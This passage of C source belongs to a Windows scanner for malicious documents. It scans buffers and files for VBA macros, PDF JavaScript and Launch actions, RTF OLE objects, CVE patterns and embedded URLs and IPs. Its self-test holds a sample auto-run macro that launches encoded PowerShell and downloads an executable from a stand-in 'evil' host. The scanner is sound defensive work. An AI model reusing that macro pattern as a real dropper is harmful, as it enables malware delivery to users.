    } else if (Doc->DocumentType == WkdDocType_RTF) {
        strncpy_s(Ioc->ThreatName, sizeof(Ioc->ThreatName), "Doc.RTF", _TRUNCATE);
    }

    return STATUS_SUCCESS;
}

/**************************************************/
/*           公开 API 面 (对齐 SS 全 API)          */
/**************************************************/

/* 整读文件到堆缓冲 (≤WKD_DOC_MAX_FILE_SIZE) */
static NTSTATUS
WkdDocReadFileToBuffer(
    _In_ PCWSTR FilePath,
    _Out_ BYTE** OutBuf,
    _Out_ PULONG OutLen
    )
{
    HANDLE h;
    LARGE_INTEGER size;
    BYTE* buf;
    DWORD rd = 0;

    *OutBuf = NULL;
    *OutLen = 0;

    h = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (h == INVALID_HANDLE_VALUE) return STATUS_NOT_FOUND;

    GetFileSizeEx(h, &size);
    if (size.QuadPart <= 0 || size.QuadPart > WKD_DOC_MAX_FILE_SIZE) {
        CloseHandle(h);
        return STATUS_FILE_TOO_LARGE;
    }
    buf = (BYTE*)malloc((size_t)size.QuadPart);
    if (!buf) { CloseHandle(h); return STATUS_NO_MEMORY; }
    if (!ReadFile(h, buf, (DWORD)size.QuadPart, &rd, NULL)) {
        free(buf); CloseHandle(h);
        return STATUS_UNSUCCESSFUL;
    }
    CloseHandle(h);
    *OutBuf = buf;
    *OutLen = rd;
    return STATUS_SUCCESS;
}

/* CVE 模式存在性判定 (对齐 SS IsMalicious L587-592, 不添加威胁) */
static BOOLEAN
WkdDocScanCvePresent(
    _In_ const BYTE* Buf,
    _In_ SIZE_T      Len
    )
{
    ULONG i;
    for (i = 0; i < (ULONG)(sizeof(g_CvePatterns) / sizeof(g_CvePatterns[0])); i++) {
        if (WkdDocFindStrNoCase(Buf, Len, g_CvePatterns[i][0])) return TRUE;
    }
    return FALSE;
}

NTSTATUS
IocDocument_ScanBuffer(
    _In_ const BYTE*      Buf,
    _In_ ULONG            Size,
    _In_ WKD_DOC_TYPE     DocType,
    _Out_ PWKD_DOC_SCAN_RESULT Result
    )
{
    if (!Buf || !Result || Size == 0) return STATUS_INVALID_PARAMETER;
    RtlZeroMemory(Result, sizeof(*Result));
    Result->DocumentType = DocType;
    Result->FileSize = Size;

    if (DocType == WkdDocType_PDF) {
        WkdDocAnalyzePdf(Buf, Size, Result);
        WkdDocScanPdfBuffer(Buf, Size, Result);
        WkdDocScanCve(Buf, Size, Result);
        WkdDocCheckDde(Buf, Size, Result);
    } else if (DocType == WkdDocType_RTF) {
        WkdDocScanRtf(Buf, Size, Result);
        WkdDocScanCve(Buf, Size, Result);
        WkdDocCheckDde(Buf, Size, Result);
    } else {
        return STATUS_NOT_SUPPORTED;
    }

    WkdDocCalculateVerdict(Result);
    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_HasMacros(
    _In_ PCWSTR   FilePath,
    _Out_ PBOOLEAN Has
    )
{
    WKD_DOC_TYPE type;
    WKD_DOC_TYPE base;
    NTSTATUS status;

    if (!FilePath || !Has) return STATUS_INVALID_PARAMETER;
    *Has = FALSE;

    status = IocDocument_DetectType(FilePath, &type);
    if (!NT_SUCCESS(status)) return status;
    base = IocDocument_ContainerOf(type);

    /* OOXML 宏类型按扩展名 (对齐 SS L524-527) */
    if (base == WkdDocType_OOXML) {
        if (type == WkdDocType_DOCM || type == WkdDocType_DOTM ||
            type == WkdDocType_XLSM || type == WkdDocType_PPTM) {
            *Has = TRUE;
        }
        return STATUS_SUCCESS;
    }

    /* legacy OLE: 字节扫 VBA 特征 (对齐 SS L529-540 流名判定) */
    if (base == WkdDocType_OLE) {
        BYTE* buf = NULL;
        ULONG len = 0;
        PWKD_DOC_SCAN_RESULT r;
        status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
        if (!NT_SUCCESS(status)) return status;
        r = (PWKD_DOC_SCAN_RESULT)malloc(sizeof(*r));
        if (!r) { free(buf); return STATUS_NO_MEMORY; }
        RtlZeroMemory(r, sizeof(*r));
        WkdDocExtractMacrosFromBuffer(buf, len, r);
        *Has = (r->MacroCount > 0);
        free(r);
        free(buf);
    }

    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_IsMalicious(
    _In_ PCWSTR   FilePath,
    _Out_ PBOOLEAN Malicious
    )
{
    DEF_SHA256_HASH hash;
    BOOLEAN found = FALSE;
    BYTE* buf = NULL;
    ULONG len = 0;
    NTSTATUS status;

    if (!FilePath || !Malicious) return STATUS_INVALID_PARAMETER;
    *Malicious = FALSE;

    /* 哈希库命中 (对齐 SS L556-563, wkd 用 ioc_hashes) */
    if (IocScanner_ComputeFileSha256(FilePath, &hash)) {
        if (NT_SUCCESS(IocScanner_QueryHash(&hash, &found)) && found) {
            *Malicious = TRUE;
            return STATUS_SUCCESS;
        }
    }

    /* YARA (SS PatternStore L565-577) → IocYaraScanner 异步覆盖 (死代码) */

    /* CVE 模式前 1MB (对齐 SS L578-592) */
    status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
    if (NT_SUCCESS(status) && buf) {
        ULONG scanLen = (len < 1024 * 1024) ? len : 1024 * 1024;
        if (WkdDocScanCvePresent(buf, scanLen)) {
            *Malicious = TRUE;
        }
        free(buf);
    }

    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_ExtractIocs(
    _In_ PCWSTR              FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT Result
    )
{
    BYTE* buf = NULL;
    ULONG len = 0;
    CHAR urls[WKD_DOC_MAX_IOC][256];
    CHAR ips[WKD_DOC_MAX_IOC][64];
    CHAR emails[WKD_DOC_MAX_EMAIL][128];
    ULONG urlCount = 0, ipCount = 0, emailCount = 0;
    ULONG c;
    NTSTATUS status;

    if (!FilePath || !Result) return STATUS_INVALID_PARAMETER;
    status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
    if (!NT_SUCCESS(status)) return status;
    if (!buf) return STATUS_NO_MEMORY;

    WkdDocExtractUrls(buf, len, WKD_DOC_MAX_IOC, urls, &urlCount);
    WkdDocExtractIps(buf, len, WKD_DOC_MAX_IOC, ips, &ipCount);
    WkdDocExtractEmails(buf, len, WKD_DOC_MAX_EMAIL, emails, &emailCount);

    for (c = 0; c < urlCount && Result->UrlCount < WKD_DOC_MAX_IOC; c++) {
        strncpy_s(Result->Urls[Result->UrlCount], 256, urls[c], _TRUNCATE);
        Result->UrlCount++;
    }
    for (c = 0; c < ipCount && Result->IpCount < WKD_DOC_MAX_IOC; c++) {
        strncpy_s(Result->Ips[Result->IpCount], 64, ips[c], _TRUNCATE);
        Result->IpCount++;
    }
    for (c = 0; c < emailCount && Result->EmailCount < WKD_DOC_MAX_EMAIL; c++) {
        strncpy_s(Result->Emails[Result->EmailCount], 128, emails[c], _TRUNCATE);
        Result->EmailCount++;
    }
    WkdDocDedupeUrls(Result->Urls, &Result->UrlCount);
    WkdDocDedupeIps(Result->Ips, &Result->IpCount);
    WkdDocDedupeEmails(Result->Emails, &Result->EmailCount);

    free(buf);
    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_AnalyzePdf(
    _In_ PCWSTR              FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT Result
    )
{
    BYTE* buf = NULL;
    ULONG len = 0;
    NTSTATUS status;

    if (!FilePath || !Result) return STATUS_INVALID_PARAMETER;
    status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
    if (!NT_SUCCESS(status)) return status;
    if (!buf) return STATUS_NO_MEMORY;

    WkdDocAnalyzePdf(buf, len, Result);
    free(buf);
    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_ExtractPdfJavaScript(
    _In_ PCWSTR  FilePath,
    _Out_ PCHAR  JsSnippets,
    _In_ ULONG   JsSnippetsSize
    )
{
    BYTE* buf = NULL;
    ULONG len = 0;
    ULONG i, off = 0;
    PWKD_DOC_SCAN_RESULT r;
    NTSTATUS status;

    if (!FilePath || !JsSnippets || JsSnippetsSize == 0) return STATUS_INVALID_PARAMETER;
    JsSnippets[0] = '\0';

    status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
    if (!NT_SUCCESS(status)) return status;
    if (!buf) return STATUS_NO_MEMORY;

    r = (PWKD_DOC_SCAN_RESULT)malloc(sizeof(*r));
    if (!r) { free(buf); return STATUS_NO_MEMORY; }
    RtlZeroMemory(r, sizeof(*r));
    WkdDocAnalyzePdf(buf, len, r);

    for (i = 0; i < r->PdfObjectCount && off + 2 < JsSnippetsSize; i++) {
        ULONG sl = (ULONG)strlen(r->PdfObjects[i].JsSnippet);
        if (sl == 0) continue;
        if (off + sl + 1 >= JsSnippetsSize) sl = JsSnippetsSize - off - 1;
        memcpy(JsSnippets + off, r->PdfObjects[i].JsSnippet, sl);
        off += sl;
        JsSnippets[off++] = '\n';
    }
    JsSnippets[off] = '\0';

    free(r);
    free(buf);
    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_ExtractOleObjects(
    _In_ PCWSTR              FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT Result
    )
{
    BYTE* buf = NULL;
    ULONG len = 0;
    NTSTATUS status;

    if (!FilePath || !Result) return STATUS_INVALID_PARAMETER;
    status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
    if (!NT_SUCCESS(status)) return status;
    if (!buf) return STATUS_NO_MEMORY;

    WkdDocExtractOleObjects(buf, len, Result);
    free(buf);
    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_ListOleStreams(
    _In_ PCWSTR  FilePath,
    _Out_ PCHAR  Streams,
    _In_ ULONG   StreamsSize
    )
{
    BYTE* buf = NULL;
    ULONG len = 0;
    NTSTATUS status;

    if (!FilePath || !Streams || StreamsSize == 0) return STATUS_INVALID_PARAMETER;
    status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
    if (!NT_SUCCESS(status)) return status;
    if (!buf) return STATUS_NO_MEMORY;

    WkdDocListOleStreams(buf, len, Streams, StreamsSize);
    free(buf);
    return STATUS_SUCCESS;
}

NTSTATUS
IocDocument_ExtractMacros(
    _In_ PCWSTR              FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT Result
    )
{
    WKD_DOC_TYPE type;
    WKD_DOC_TYPE base;
    BYTE* buf = NULL;
    ULONG len = 0;
    NTSTATUS status;

    if (!FilePath || !Result) return STATUS_INVALID_PARAMETER;
    status = IocDocument_DetectType(FilePath, &type);
    if (!NT_SUCCESS(status)) return status;
    base = IocDocument_ContainerOf(type);

    if (base == WkdDocType_OOXML) {
        WkdDocExtractOoxmlMacros(FilePath, Result);
    } else if (base == WkdDocType_OLE) {
        status = WkdDocReadFileToBuffer(FilePath, &buf, &len);
        if (NT_SUCCESS(status) && buf) {
            WkdDocExtractMacrosFromBuffer(buf, len, Result);
            free(buf);
        }
    }

    return STATUS_SUCCESS;
}

/**************************************************/
/*               DOC_SELFTEST 自测                 */
/*  仿 IoaRateAnalyzer RA_SELF_TEST 惯例,         */
/*  死代码: 独立 -DDOC_SELFTEST 编译执行。        */
/**************************************************/

#ifdef DOC_SELFTEST

#include <assert.h>

static void
WkdDocSelfTestMain(
    void
    )
{
    WKD_DOC_SCAN_RESULT r;
    CHAR urls[WKD_DOC_MAX_IOC][256];
    CHAR ips[WKD_DOC_MAX_IOC][64];
    CHAR emails[WKD_DOC_MAX_EMAIL][128];
    ULONG urlCount = 0, ipCount = 0, emailCount = 0;
    BYTE pdfBuf[1024];
    BYTE rtfBuf[1024];
    ULONG n;

    /* 1. VBA 分析: AutoOpen + Shell + 下载 URL */
    RtlZeroMemory(&r, sizeof(r));
    IocDocument_AnalyzeVBACode(
        "Sub AutoOpen()\r\n  Shell \"powershell -enc AAAA\"\r\n"
        "  URLDownloadToFile \"http://evil.example.com/p.exe\", \"C:\\x.exe\"\r\nEnd Sub",
        &r);
    assert(r.HasMacros && r.MacroCount == 1);
    assert(r.Macros[0].IsAutoExec);
    assert(r.Macros[0].HasShellExec);
    assert(r.Macros[0].HasPowerShell);
    assert(r.Macros[0].HasDownload);
    assert(r.UrlCount >= 1);
    assert(r.RiskScore >= 80);

    /* 2. 普通宏无风险 */
    RtlZeroMemory(&r, sizeof(r));
    IocDocument_AnalyzeVBACode("Sub Foo()\r\n  MsgBox \"hi\"\r\nEnd Sub", &r);
    assert(r.Macros[0].RiskLevel == 0);

    /* 3. URL/IP/Email 提取 */
    {
        static const char text[] =
            "visit http://bad.example.com/a.b now 1.2.3.4 127.0.0.1 "
            "contact admin@evil.com 10.20.30.40";
        WkdDocExtractUrls((const BYTE*)text, sizeof(text) - 1, WKD_DOC_MAX_IOC, urls, &urlCount);
        assert(urlCount >= 1);
        WkdDocExtractIps((const BYTE*)text, sizeof(text) - 1, WKD_DOC_MAX_IOC, ips, &ipCount);
        /* 1.2.3.4 与 10.20.30.40 应命中, 127.0.0.1 跳过 */
        assert(ipCount == 2);
        WkdDocExtractEmails((const BYTE*)text, sizeof(text) - 1, WKD_DOC_MAX_EMAIL, emails, &emailCount);
        assert(emailCount == 1);
    }

    /* 4. PDF action 扫描 */
    RtlZeroMemory(&r, sizeof(r));
    memcpy(pdfBuf, "%PDF-1.7\n", 9);
    memcpy(pdfBuf + 9, "1 0 obj\n<< /Type /Action /S /Launch >>\nendobj\n", 46);
    n = 9 + 46;
    WkdDocScanPdfBuffer(pdfBuf, n, &r);
    assert(r.HasPdfActions);
    assert(r.CriticalThreats >= 1); /* Launch → 85 */

    /* 5. RTF objdata 扫描 */
    RtlZeroMemory(&r, sizeof(r));
    memcpy(rtfBuf, "{\\rtf1\\objdata 01050000...}", 28);
    WkdDocScanRtf(rtfBuf, 28, &r);
    assert(r.HasOLEObjects);

    /* 6. CVE 模式 */
    RtlZeroMemory(&r, sizeof(r));
    WkdDocScanCve((const BYTE*)"Equation.3 exploit here", 23, &r);
    assert(r.CriticalThreats >= 1);

    printf("DOC_SELFTEST PASSED\n");
}

int
main(
    void
    )
{
    WkdDocSelfTestMain();
    return 0;
}

#endif /* DOC_SELFTEST */
